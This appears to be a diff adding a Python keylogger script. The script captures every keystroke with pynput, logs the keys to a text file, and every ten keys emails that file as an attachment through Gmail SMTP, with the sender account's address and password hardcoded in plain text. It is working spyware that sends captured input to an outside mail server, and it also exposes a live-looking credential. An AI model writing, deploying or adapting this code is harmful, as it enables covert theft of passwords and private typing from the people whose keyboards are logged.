@@ -1,0 +1,97 @@
+#importing pynput to monitor input devices
+import pynput
+#importing smtplib to define a SMTP client session
+import smtplib
+#imorting the key and listener modules
+from pynput.keyboard import Key, Listener
+#importing 'basename' module from 'os.path'
+from os.path import basename
+#importing MIMEText from email.mime.text module to allow sending emails
+from email.mime.text import MIMEText
+#importing the multipart to state that it is more than one part
+from email.mime.multipart import MIMEMultipart
+#importing MIMEApllication to represent message objects of major types
+from email.mime.application import MIMEApplication
+#the email address of the sender
+from_addr = 'smtpt9811@gmail.com'
+#the email address of the receiver
+to_addr = 'smtpt9811@gmail.com'
+#the subject of the email
+subject = 'I just sent this attachment from Python!'
+#the body of the email
+content = 'How neat is that?'
+#a counter variable
+count = 0
+#empty string to record the keys in
+keys = []
+def on_press(key):
+    global keys, count
+    #adding the keys pressed to the list
+    keys.append(key)
+    #incrementing the count by 1
+    count+= 1
+    #printing the key pressed
+    print("{0} pressed". format(key))
+    #sending the email after 10 characters recorded
+    if count >= 10:
+        #making the variable 0 to count again
+        count =0
+        #sending the email
+        send_mail()
+        #writing in the text file
+        write_file(keys)
+        #emptying the list
+        keys = []
+ 
+def write_file(keys):
+    #opening the text file
+    with open("loggin.txt","a") as f:
+        for key in keys:
+            #used to replace a phrase with another phrase
+            k = str(key).replace("'","")
+            #using 'find' to find the first occurence of the condition
+            if k.find("space") > 0:
+                #going to the next line
+              f.write('\n')
+              
+            elif k.find("key") == -1:
+                f.write(k)
+def send_mail():
+    #it has multiple parts
+    msg = MIMEMultipart()
+    #stating the sender
+    msg['From'] = from_addr
+    #stating the receiver
+    msg['To'] = to_addr
+    #the subject of the email
+    msg['Subject'] = subject
+    body = MIMEText(content, 'plain')
+    #attaching the body of the email
+    msg.attach(body)
+    filename="loggin.txt"
+    with open("loggin.txt", "r") as f:
+        part = MIMEApplication(f.read(), Nmae=basename(filename))
+        part['content-Disposition'] = 'attachment; filename="{}"'.format(basename(filename))
+    msg.attach(part)
+    #secure socket layer"
+    server = smtplib.SMTP_SSL('smtp.gmail.com', )
+    #gmail socket is 465
+    server.connect("smtp.gmail.com",465)
+    #email and password to login
+    server.login('smtpt9811@gmail.com', 'P@ss01163')
+    #sending the email
+    server.send_message(msg, from_addr=from_addr, to_addrs=[to_addr])
+    
+    #session.sendmail("smtpt9811@gmail.com", "smtpt9811@gmail.com", message)
+    print('\n sent')
+    
+def on_release(key):
+    if key==Key.esc:
+        return False
+
+
+
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
+
